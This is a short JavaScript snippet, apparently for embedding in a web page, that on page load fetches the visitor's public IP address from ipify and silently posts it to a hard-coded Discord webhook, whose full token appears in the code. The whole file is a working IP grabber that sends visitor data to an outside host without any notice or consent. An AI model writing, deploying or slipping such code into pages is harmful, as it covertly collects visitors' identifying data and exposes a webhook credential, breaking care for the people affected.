    // Function to fetch user's IP address
    function getUserIP(callback){
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => callback(data.ip))
          .catch(error => console.error('Error fetching IP address:', error));
      }
      
      // Function to send message to Discord webhook
      function sendToDiscord(ip){
        const webhookURL = 'https://discord.com/api/webhooks/1214009147507478528/rzfveRUg5rZggW9yG9QqHl4MBZPScvU45eyJM7kNp613W0sdCaJ9GISQ7UpYV8xnBvq7';
        
        // Construct message payload
        const payload = {
          content: `User's IP address: ${ip}`
        };
        
        // Send message to Discord webhook
        fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        })
        .then(response => {
          if (!response.ok) {
            console.error('Failed to send message to Discord:', response.status, response.statusText);
          }
        })
        .catch(error => console.error('Error sending message to Discord:', error));
      }
      
      // Call getUserIP function when the page loads
      window.onload = function() {
        getUserIP(sendToDiscord);
      };